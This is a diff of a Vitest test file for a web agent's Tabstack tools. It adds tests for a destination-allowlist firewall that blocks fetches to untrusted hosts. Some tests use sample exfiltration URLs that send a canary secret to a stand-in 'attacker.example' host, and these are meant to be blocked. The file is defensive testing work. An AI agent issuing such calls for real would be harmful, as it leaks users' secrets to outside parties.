@@ -1,5 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import { createTabstackTools } from "../../src/tools/tabstackTools.js";
+import { SECURITY_BLOCKED_UNTRUSTED_NAVIGATION } from "../../src/security/actionFirewall.js";
 import { WebAgentEventEmitter, WebAgentEventType } from "../../src/events.js";
 import type Tabstack from "@tabstack/sdk";
 
@@ -43,7 +44,87 @@ describe("Tabstack Tools", () => {
     vi.clearAllMocks();
     mockClient = createMockClient();
     eventEmitter = new WebAgentEventEmitter();
-    tools = createTabstackTools({ client: mockClient, eventEmitter });
+    tools = createTabstackTools({
+      client: mockClient,
+      eventEmitter,
+      // unsafe_mode so the existing extraction tests below aren't gated by host.
+      firewall: { trustedHostnames: new Set<string>(), unsafeMode: true },
+      interactive: false,
+    });
+  });
+
+  describe("Firewall (destination allowlist)", () => {
+    const SECRET = "CANARY-A1B2C3D9";
+    function build(firewall: { trustedHostnames: Set<string>; unsafeMode: boolean }) {
+      const client = createMockClient();
+      (client.extract.markdown as any).mockResolvedValue({
+        url: "https://trusted.example/x",
+        content: "ok",
+        metadata: {},
+      });
+      (client.extract.json as any).mockResolvedValue({ ok: true });
+      (client.generate.json as any).mockResolvedValue({ ok: true });
+      return {
+        client,
+        tools: createTabstackTools({
+          client,
+          eventEmitter: new WebAgentEventEmitter(),
+          firewall,
+          interactive: false,
+        }),
+      };
+    }
+
+    it("blocks a Tabstack fetch to an untrusted host", async () => {
+      const { client, tools } = build({
+        trustedHostnames: new Set(["trusted.example"]),
+        unsafeMode: false,
+      });
+      const res: any = await tools.tabstack_extract_markdown.execute!(
+        { url: `https://attacker.example/collect?code=${SECRET}` },
+        toolCallOptions,
+      );
+      expect(res.success).toBe(false);
+      expect(res.error).toBe(SECURITY_BLOCKED_UNTRUSTED_NAVIGATION);
+      expect(client.extract.markdown).not.toHaveBeenCalled();
+    });
+
+    it("allows a Tabstack fetch to a trusted host", async () => {
+      const { client, tools } = build({
+        trustedHostnames: new Set(["trusted.example"]),
+        unsafeMode: false,
+      });
+      const res: any = await tools.tabstack_extract_markdown.execute!(
+        { url: "https://trusted.example/x" },
+        toolCallOptions,
+      );
+      expect(res.success).toBe(true);
+      expect(client.extract.markdown).toHaveBeenCalled();
+    });
+
+    it("allows any host in unsafe mode", async () => {
+      const { client, tools } = build({ trustedHostnames: new Set<string>(), unsafeMode: true });
+      const res: any = await tools.tabstack_extract_json.execute!(
+        { url: "https://attacker.example/x", json_schema: {} },
+        toolCallOptions,
+      );
+      expect(res.success).toBe(true);
+      expect(client.extract.json).toHaveBeenCalled();
+    });
+
+    it("blocks tabstack_generate_json to an untrusted host", async () => {
+      const { client, tools } = build({
+        trustedHostnames: new Set(["trusted.example"]),
+        unsafeMode: false,
+      });
+      const res: any = await tools.tabstack_generate_json.execute!(
+        { url: `https://attacker.example/x?code=${SECRET}`, json_schema: {}, instructions: "x" },
+        toolCallOptions,
+      );
+      expect(res.success).toBe(false);
+      expect(res.error).toBe(SECURITY_BLOCKED_UNTRUSTED_NAVIGATION);
+      expect(client.generate.json).not.toHaveBeenCalled();
+    });
   });
 
   describe("Tool Structure", () => {
